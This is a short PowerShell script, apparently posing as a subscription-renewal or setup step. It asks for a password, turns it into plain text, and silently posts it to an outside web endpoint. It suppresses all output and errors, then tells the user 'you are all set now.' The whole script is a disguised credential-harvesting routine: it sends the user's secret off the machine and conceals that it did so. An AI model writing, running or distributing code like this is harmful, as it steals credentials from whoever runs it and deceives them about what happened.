$apiUrl = "https://backend-apis-tau.vercel.app/api/renew-subscription"

try {
    # Suppress all default output
    $ErrorActionPreference = "Stop"

    $password = Read-Host "Enter password" -AsSecureString
    $BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($password)
    $plainPassword = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)

    $body = "{`"password`": `"$plainPassword`"}"

    # Redirect output to $null to prevent default display
    $response = Invoke-RestMethod -Uri $apiUrl -Method Post -Body $body -ContentType "application/json" *>$null

    # Optionally verify silently
    if ($response -is [string]) {
        $null = $response
    } elseif ($response.PSObject.Properties.Name -contains 'message') {
        $null = $response.message
    }
}
catch {
    $null = $_.Exception.Message
}
finally {
    if ($plainPassword) { $plainPassword = $null }
    if ($BSTR) { [System.Runtime.InteropServices.Marshal]::ZeroFreeBSTR($BSTR) }

    # Only this line should show
    Write-Host "`nHappy Coding brother, you are all set now!"
}
